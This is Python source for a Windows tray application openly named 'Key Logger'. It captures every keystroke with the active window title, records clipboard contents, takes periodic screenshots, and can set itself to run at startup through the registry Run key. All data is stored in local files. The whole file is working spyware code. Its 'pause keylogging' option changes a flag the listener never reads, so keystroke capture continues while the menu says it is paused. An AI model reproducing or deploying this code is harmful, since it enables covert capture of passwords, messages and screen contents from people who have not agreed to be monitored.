import os
import sys
import time
import json
import winreg
import logging
import requests
import threading
import pyautogui
import pyperclip
import webbrowser
from io import BytesIO
import pygetwindow as gw
from pynput import keyboard
from datetime import datetime
from plyer import notification
from PIL import Image, ImageDraw
from pystray import Icon, Menu, MenuItem

# Global variables
APP_NAME = "Key Logger"
is_running = True
listener_running = True
is_startup_enabled = False # Global variable to track the "Run on Startup" state
screenshot_interval = 60  # Default interval (seconds)
lock = threading.Lock()
current_window = None  # Currently active window
current_keys = []  # Keys typed in the current window
last_clipboard_content = None  # To track clipboard changes
current_line = ""
first_entry = True
active_window = ""

# Default configuration
DEFAULT_INTERVAL = 300  # Default interval in seconds (5 minutes)


# Determine the application directory for logging error
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Check if the script is bundled
    app_dir = os.path.dirname(sys.executable)  # Directory of the .exe file
else:
    app_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
    
# Log file path in the application directory
LOG_FILE = os.path.join(app_dir, "keylogerror.log")
# Ensure the log file exists or create it
if not os.path.exists(LOG_FILE):
    try:
        with open(LOG_FILE, 'w'):  # Create the file if it doesn't exist
            pass
    except Exception as e:
        print(f"Error creating log file: {e}")
        raise

# Configure logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
# Test logging
logging.info("Application started successfully.")


# Determine the application directory for images files
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
image_folders = os.path.join(app_dir, "image")
ICON_PATH = os.path.join(image_folders, "icon.ico")
# Ensure the logs folder exists
try:
    os.makedirs(image_folders, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"icon is at {ICON_PATH}")
except Exception as e:
    print(f"Error creating image folder: {e}")
    raise SystemExit(f"Error: Unable to create image folder. {e}")


# Determine the application directory for screenshot folder
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Check if the script is bundled as .exe
    app_dir = os.path.dirname(sys.executable)  # Directory of the .exe file
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
    
# Define the screenshots folder path
screenshot_folder = os.path.join(app_dir, "screenshots")
# Ensure the screenshots folder exists
try:
    os.makedirs(screenshot_folder, exist_ok=True)
    logging.info(f"'screenshots' folder ready at {screenshot_folder}")
except Exception as e:
    logging.error(f"Error creating 'screenshots' folder: {e}")
    raise SystemExit(f"Error: Unable to create 'screenshots' folder. {e}")


# Determine the application directory for log files
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
logs_folder = os.path.join(app_dir, "logs")
keylog_file = os.path.join(logs_folder, "key_log.txt")
# Ensure the logs folder exists
try:
    os.makedirs(logs_folder, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"keylog file is at {keylog_file}")
except Exception as e:
    print(f"Error creating logs folder: {e}")
    raise SystemExit(f"Error: Unable to create logs folder. {e}")
# clipboard log file path
clipboard_log_file = os.path.join(logs_folder, "clipboard_log.txt")
logging.info(f"clipbard log file is at {clipboard_log_file}")
# configuration file path
CONFIG_FILE = os.path.join(logs_folder, "config.json")
logging.info(f"clipbard log file is at {CONFIG_FILE}")


# Notification function
# ----------------------------------------------------------------------------------
def show_notification(title, message):
    """
    Show a system notification.
    """
    try:
        notification.notify(
            title=APP_NAME,
            message=message,
            app_name=APP_NAME,
            # app_icon=ICON_PATH,
            app_icon=ICON_PATH if os.path.exists(ICON_PATH) else None,
            timeout=3
        )
    except Exception as e:
        logging.error(f"Notification Error: {e}")
        

# save configuration & restore 
# ----------------------------------------------------------------------------------
# Load the interval from JSON
def load_config():
    global screenshot_interval
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as file:
                config = json.load(file)
                screenshot_interval = config.get("screenshot_interval", 300)  # Default to 5 minutes
        else:
            screenshot_interval = 300  # Default value
            save_config()  # Save the default value to file
    except Exception as e:
        print(f"Error loading config: {e}")
        screenshot_interval = 300  # Default value

# Save the interval to JSON
def save_config():
    try:
        config = {"screenshot_interval": screenshot_interval}
        with open(CONFIG_FILE, "w") as file:
            json.dump(config, file, indent=4)
    except Exception as e:
        print(f"Error saving config: {e}")

# Restore the default configuration
def restore_defaults(icon, item=None):
    global screenshot_interval
    try:
        with lock:
            screenshot_interval = DEFAULT_INTERVAL  # Reset to default
            save_config()  # Save the default value to the JSON file

        interval_display = (
            f"{screenshot_interval} seconds" if screenshot_interval < 60 else
            f"{screenshot_interval // 60} minutes" if screenshot_interval < 3600 else
            f"{screenshot_interval // 3600} hour"
        )

        # Notify the user
        # show_notification(APP_NAME, f"Configuration restored to default: {interval_display}.")
        show_notification(APP_NAME, f"Default settings have been restored.")
        logging.info("Configuration restored to default.")
        update_checkmarks(icon)  # Update the checkmarks in the menu
    except Exception as e:
        logging.error(f"Error restoring defaults: {e}")
        show_notification(APP_NAME, "Failed to restore default configuration.")


# Get the active window's title
# ----------------------------------------------------------------------------------
def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        if window is not None:
            return window.title
        return "Unknown Application"
    except Exception as e:
        print(f"Error getting active window title: {e}")
        logging.error(f"Error getting active window title: {e}")
        return "Unknown Application"


# Write a log entry to the file
# ----------------------------------------------------------------------------------
def write_log_entry(window, keys, include_window_info=False):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            if include_window_info:  # Log the window info only once per window change
                log_file.write(f"\n[{timestamp}] - Active Window: {window}\n")
                log_file.write("----------------\n")
            if keys:
                log_file.write(f"{timestamp}: {''.join(keys)}\n")
        # print(f"Logged: {''.join(keys)}")  # Optional for debugging
    except Exception as e:
        logging.error(f"Error write_log_entry: {e}")


# Handle key press events
# ----------------------------------------------------------------------------------
def on_press(key):
    global current_window, current_keys

    # Get the active window title
    active_window = get_active_window_title()

    # Detect window change
    if current_window != active_window:
        if current_window:
            # Log the previous window's data
            write_log_entry(current_window, current_keys)
        # Reset for the new window
        current_window = active_window
        current_keys = []
        write_log_entry(current_window, [], include_window_info=True)  # Log the new window info
    # logging.info(f"current window: {current_window}")
    
    # Handle key input
    try:
        key_char = key.char  # For printable characters
    except AttributeError as e:
        key_char = f"[{key}]"  # For special keys (e.g., Enter, Backspace)
        # logging.error(f"Error handling key input on_press: {e}")

    # Record the key
    # Define a mapping for special keys to normalize their representation
    special_keys = {
        "[Key.space]": " ",
        "[Key.enter]": "\n",
        "[Key.esc]": "[Esc]",
        "[Key.tab]": "[Tab]",
        "[Key.caps_lock]": "[Caps Lock]",
        "[Key.shift]": "[Shift]",
        "[Key.shift_r]": "[Shift]",
        "[Key.ctrl]": "[Ctrl]",
        "[Key.ctrl_l]": "[Ctrl]",
        "[Key.ctrl_r]": "[Ctrl]",
        "[Key.fn]": "[Fn]",
        "[Key.cmd]": "[Win]",
        "[Key.cmd_l]": "[Win]",
        "[Key.cmd_r]": "[Win]",
        "[Key.alt]": "[Alt]",
        "[Key.alt_l]": "[Alt]",
        "[Key.alt_r]": "[Alt]",
        "[Key.alt_gr]": "[Alt]",
        "[Key.insert]": "[Insert]",
        "[Key.print_screen]": "[PrtSc]",
        "[Key.delete]": "[Delete]",
        "[Key.backspace]": "[Backspace]",
        "[Key.up]": "[Up Arrow]",
        "[Key.down]": "[Down Arrow]",
        "[Key.left]": "[Left Arrow]",
        "[Key.right]": "[Right Arrow]",
        "[Key.home]": "[Home]",
        "[Key.end]": "[End]",
        "[Key.page_up]": "[Page Up]",
        "[Key.page_down]": "[Page Down]",
        # Function keys
        "[Key.f1]": "[F1]",
        "[Key.f2]": "[F2]",
        "[Key.f3]": "[F3]",
        "[Key.f4]": "[F4]",
        "[Key.f5]": "[F5]",
        "[Key.f6]": "[F6]",
        "[Key.f7]": "[F7]",
        "[Key.f8]": "[F8]",
        "[Key.f9]": "[F9]",
        "[Key.f10]": "[F10]",
        "[Key.f11]": "[F11]",
        "[Key.f12]": "[F12]",
        # Add any other special keys here as needed
    }

    try:
        # Process the key character
        if key_char in special_keys:
            current_keys.append(special_keys[key_char])
        elif key_char is not None:  # Ignore None values
            current_keys.append(key_char)
        # else:
        #     current_keys.append(key_char)
    except Exception as e:
        logging.error(f"Error processing key press: {e}")
        pass  


# Handle key release events
# ----------------------------------------------------------------------------------
def on_release(key):
    try:
        if key == keyboard.Key.esc:
            # On Esc key, finalize logging and stop the listener
            write_log_entry(current_window, current_keys)
            print("Keylogger stopped.")
            logging.info(f"keylogger stopped")
            return False
    except Exception as e:
        logging.error(f"Error on_release: {e}")


# Start the keylogger
# ----------------------------------------------------------------------------------
def start_keylogger():
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            log_file.write(f"\n\n\n[{timestamp}]---keylogger started---\n")
        logging.info(f"[{timestamp}]---keylogger started---")
        # listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        # listener.start()
        # listener.join()
    except Exception as e:
        logging.error(f"Error on start_keylogger: {e}")


# Monitor clipboard changes
# ----------------------------------------------------------------------------------
def monitor_clipboard():
    global last_clipboard_content
    while True:
        try:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                last_clipboard_content = current_clipboard_content
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(clipboard_log_file, "a", encoding="utf-8") as log_file:
                    log_file.write(f"{timestamp}: Copied: {current_clipboard_content}\n\n")
                # print(f"Clipboard updated: {current_clipboard_content}")  # Optional for debugging
            # logging.info(f"monitor_clipboard")
        except Exception as e:
            print(f"Error monitoring clipboard: {e}")
            # logging.error(f"Error monitoring clipboard: {e}")
            pass
        time.sleep(1)  # Polling interval


# Take a screenshot
# ----------------------------------------------------------------------------------
# def take_screenshot():
#     global screenshot_interval
#     while True:
#         try:
#             if is_running:
#                 timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
#                 filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
#                 pyautogui.screenshot(filename)
#                 print(f"Screenshot saved: {filename}")
#             time.sleep(screenshot_interval)
#             # logging.info(f"take_screenshot")
#         except Exception as e:
#             logging.error(f"Error taking screenshot: {e}")
        
def take_screenshot():
    global screenshot_interval
    while True:
        try:
            if is_running:
                timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
                pyautogui.screenshot(filename)
                print(f"Screenshot saved: {filename}")
                logging.info(f"take_screenshot-->Screenshot saved: {filename}")
            with lock:
                current_interval = screenshot_interval   # Ensure thread-safe interval update
            time.sleep(current_interval)
        except Exception as e:
            # logging.error(f"Error taking screenshot: {e}")
            pass


# Toggle screenshot taking
# ----------------------------------------------------------------------------------
def toggle_screenshots(icon, item):
    global is_running
    is_running = not is_running
    if (is_running == True):
        show_notification(APP_NAME, "Enabled taking Screenshot")
    else:
        show_notification(APP_NAME, "Disabled taking Screenshot")
    logging.info(f"toggle_screenshot")
    

# Toggle keylogging
# ----------------------------------------------------------------------------------
def toggle_keylogging(icon, item):
    global listener_running
    listener_running = not listener_running
    if(listener_running == True):
        show_notification(APP_NAME, "Enabled Keylogger")
    else:
        show_notification(APP_NAME, "Disabled Keylogger")
    logging.info(f"toggle_keylogging")
        

# Update screenshot interval
# ----------------------------------------------------------------------------------
# def set_interval(icon, item):
#     global screenshot_interval
#     try:
#         with lock:
#             screenshot_interval = int(item.text.split()[0])
#         update_checkmarks(icon)
#         # icon.notify(f"Screenshot interval set to {screenshot_interval} seconds.")
#         show_notification(APP_NAME, f"Screenshot interval set to {screenshot_interval} seconds.")
#         logging.info(f"set_interval")
#     except Exception as e:
#         logging.error(f"Error in set_interval: {e}")

# def set_interval(icon, item):
#     global screenshot_interval
#     try:
#         with lock:
#             # Parse the interval value from the menu item's text
#             if "seconds" in item.text:
#                 screenshot_interval = int(item.text.split()[0])
#             elif "Minutes" in item.text:
#                 screenshot_interval = int(item.text.split()[0]) * 60
#             elif "Hour" in item.text:
#                 screenshot_interval = int(item.text.split()[0]) * 3600

#         update_checkmarks(icon)
#         show_notification(APP_NAME, f"Screenshot interval set to {screenshot_interval} seconds.")
#         logging.info(f"Interval set to {screenshot_interval} seconds.")
#     except Exception as e:
#         logging.error(f"Error in set_interval: {e}")


def set_interval(icon, item):
    global screenshot_interval
    try:
        with lock:
            # Parse the interval value and format
            text = item.text
            if "seconds" in text:
                screenshot_interval = int(text.split()[0])  # Keep seconds as is
                interval_display = f"{screenshot_interval} seconds"
            elif "Minutes" in text:
                screenshot_interval = int(text.split()[0]) * 60  # Convert minutes to seconds
                interval_display = f"{text.split()[0]} minutes"
            elif "Hour" in text:
                screenshot_interval = int(text.split()[0]) * 3600  # Convert hours to seconds
                interval_display = f"{text.split()[0]} hour"

        save_config()  # Save the new interval to the JSON file
        # Update menu checkmarks and show a notification
        update_checkmarks(icon)
        show_notification(APP_NAME, f"Screenshot interval set to {interval_display}.")
        logging.info(f"Interval set to {interval_display}.")
    except Exception as e:
        logging.error(f"Error in set_interval: {e}")


# Stop script
# ----------------------------------------------------------------------------------
def stop_script(icon):
    try:
        # Log the previous window's data
        write_log_entry(current_window, current_keys)
        show_notification(APP_NAME, "Keylogger is terminated...")
        logging.info(f"Script terminated\n\n\n")
        print("Stopping script...")
        # icon.notify(f"Keylogger terminated")
        os._exit(0)
    except Exception as e:
        logging.error(f"Error in stop_script: {e}")


# function to open developer page in browser 
# ----------------------------------------------------------------------------------
def on_open_developer(icon):
    try:
        url = "https://bibekchandsah.com.np/developer.html"
        webbrowser.open(url)
        show_notification(APP_NAME, "Opening Developer Page...")
        logging.info(f"open_developer")
    except Exception as e:
        logging.error(f"Error opening Developer: {e}")


# Restart script
# ----------------------------------------------------------------------------------
def restart_script(icon, item):
    try:
        print("Restarting script...")
        logging.info(f"Restarting script...\n\n")
        # icon.notify(f"Restarting the Keylogger")
        show_notification(APP_NAME, "Restarting Keylogger...")
        # global listener
        # listener.stop()
        icon.stop()
        # os.execv(sys.executable, ['python'] + sys.argv)
        os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as e:
        logging.error(f"Error restarting script: {e}")


# Toggle startup option
# ----------------------------------------------------------------------------------
def toggle_startup(enable):
    """
    Enable or disable running the application on startup.
    """
    global is_startup_enabled
    try:
        startup_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        if enable:
            winreg.SetValueEx(startup_key, APP_NAME, 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
            show_notification(APP_NAME, "Enabled startup at boot.")
            logging.info(f"Startup Enabled")
        else:
            winreg.DeleteValue(startup_key, APP_NAME)
            show_notification(APP_NAME, "Disabled startup at boot.")
            logging.info(f"Startup Disabled")
        is_startup_enabled = enable
        winreg.CloseKey(startup_key)
    except Exception as e:
        logging.error(f"Error toggling startup: {e}")
        show_notification(APP_NAME, f"Error: {e}")

def is_startup_checked(item):
    """
    Return whether the "Run on Startup" option is enabled.
    The `item` argument is required by pystray but not used here.
    """
    # logging.info(f"check startup")
    return is_startup_enabled

def on_toggle_startup(icon, item):
    """
    Toggle the startup status based on user selection.
    """
    # logging.info(f"on toggle startup")
    toggle_startup(not is_startup_enabled)


# Open log file    
# ----------------------------------------------------------------------------------    
def on_open_log(icon, item):
    """
    Open the log file in the default text editor.
    """
    logging.warning(f"Log file is opened")
    try:
        if os.path.exists(LOG_FILE):
            os.startfile(LOG_FILE)
        else:
            raise FileNotFoundError("Log file not found.")
    except Exception as e:
        logging.error(f"Error opening log file: {e}")
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the log file.")
       
        
# Open keylog file  
# ----------------------------------------------------------------------------------      
def open_keylog_file(icon, item):
    """
    Open the keylog file in the default text editor.
    """
    logging.warning(f"Keylog file is opened")
    try:
        if os.path.exists(keylog_file):
            os.startfile(keylog_file)
        else:
            raise FileNotFoundError("Keylog file not found.")
    except Exception as e:
        logging.error(f"Error opening log file: {e}")
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Keylog file.")   
    
        
# Open keylog file 
# ----------------------------------------------------------------------------------       
def open_copy_keylog_file(icon, item):
    """
    Open the Copy keylog file in the default text editor.
    """
    logging.warning(f"copied Log file is opened")
    try:
        if os.path.exists(clipboard_log_file):
            os.startfile(clipboard_log_file)
        else:
            raise FileNotFoundError("Copy Keylog file not found.")
    except Exception as e:
        logging.error(f"Error opening log file: {e}")
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Copy Keylog file.")        
        
        
# Open screenshot folder
# ----------------------------------------------------------------------------------        
def open_Screenshot_folder(icon, item):
    """
    Open the screenshot folder.
    """
    logging.warning(f"Screenshot folder is opened")
    try:
        if os.path.exists(screenshot_folder):
            os.startfile(screenshot_folder)
        else:
            raise FileNotFoundError("Screenshot folder not found.")
    except Exception as e:
        logging.error(f"Error opening Screenshot folder: {e}")
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Screenshot folder.")


# Update checkmarks dynamically
# ----------------------------------------------------------------------------------
def update_checkmarks(icon):
    interval_menu = Menu(
        MenuItem("30 seconds", set_interval, checked=lambda item: screenshot_interval == 30),
        MenuItem("60 seconds", set_interval, checked=lambda item: screenshot_interval == 60),
        MenuItem("2 Minutes", set_interval, checked=lambda item: screenshot_interval == 120),
        MenuItem("5 Minutes", set_interval, checked=lambda item: screenshot_interval == 300),
        MenuItem("10 Minutes", set_interval, checked=lambda item: screenshot_interval == 600),
        MenuItem("20 Minutes", set_interval, checked=lambda item: screenshot_interval == 1200),
        MenuItem("30 Minutes", set_interval, checked=lambda item: screenshot_interval == 1800),
        MenuItem("1 Hour", set_interval, checked=lambda item: screenshot_interval == 3600),
    )

    menu = Menu(
        MenuItem("Pause/Resume Screenshots", toggle_screenshots, checked=lambda item: is_running),
        MenuItem("Pause/Resume Keylogging", toggle_keylogging, checked=lambda item: listener_running),
        MenuItem("Set Screenshot Interval", interval_menu),
        MenuItem("Run on Startup", on_toggle_startup, checked=is_startup_checked),
        Menu.SEPARATOR,
        MenuItem("View Keylog", open_keylog_file),
        MenuItem("View Copied Keylog", open_copy_keylog_file),
        MenuItem("View Screenshot", open_Screenshot_folder),
        MenuItem("View Log", on_open_log),
        Menu.SEPARATOR,
        MenuItem("Restore Defaults", restore_defaults),  # Add restore option
        MenuItem("Developer", on_open_developer),
        MenuItem("Restart", restart_script),
        MenuItem("Exit", stop_script),
    )

    icon.menu = menu


# create icon for system tray
# ----------------------------------------------------------------------------------
def create_icon():
    icon_image = Image.new("RGB", (64, 64), color=(255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.ellipse((16, 16, 48, 48), fill=(0, 0, 255))


# Create tray icon
# ----------------------------------------------------------------------------------
def create_tray_icon():
    """
    Create the system tray icon and menu.
    """
    def get_icon():
        """Retrieve the icon image."""
        try:
            # Check if the local icon file exists
            if os.path.exists(ICON_PATH):
                return Image.open(ICON_PATH)

            # If local file doesn't exist, try fetching from URL
            url = "https://cdn-icons-png.flaticon.com/512/4616/4616208.png"  # Replace with your image URL
            response = requests.get(url, timeout=5)
            response.raise_for_status()  # Raise an exception for HTTP errors
            return Image.open(BytesIO(response.content))

        except (FileNotFoundError, requests.exceptions.RequestException) as e:
            logging.error(f"Icon Load Error: {e}")
            return create_icon()  # Return a blue image as a fallback
    
    try:
        icon = Icon(
            APP_NAME, 
            get_icon(), 
            APP_NAME
        )
        update_checkmarks(icon)
        icon.run()
    except Exception as e:
        logging.error(f"Tray Icon Error: {e}")
        show_notification("Error", "Failed to load tray icon.")
        sys.exit(1)


def main():
    try:
        if not os.path.exists(ICON_PATH):
            logging.error("Icon file not found. Notifications will not include an icon.")
        show_notification(f"{APP_NAME} Started", "The application has started successfully.")
        
        # Start keylogger
        start_keylogger()
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        # listener = keyboard.Listener(on_press=on_press)
        listener.start()

        # Start Keylogger in Thread
        # keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
        # keylogger_thread.start()

        # Start clipboard monitoring thread
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()

        load_config()  # Load the interval from JSON
        # Notify the user of the loaded interval
        # interval_display = (
        #     f"{screenshot_interval} seconds" if screenshot_interval < 60 else
        #     f"{screenshot_interval // 60} minutes" if screenshot_interval < 3600 else
        #     f"{screenshot_interval // 3600} hour"
        # )
        # show_notification(APP_NAME, f"Loaded screenshot interval: {interval_display}.")
        
        # Start screenshot thread
        screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
        screenshot_thread.start()

        # Start tray icon
        create_tray_icon()
        
    except KeyboardInterrupt:
        logging.info("Application interrupted by user.")
        show_notification(APP_NAME, "Keylogger is closing...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Main Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
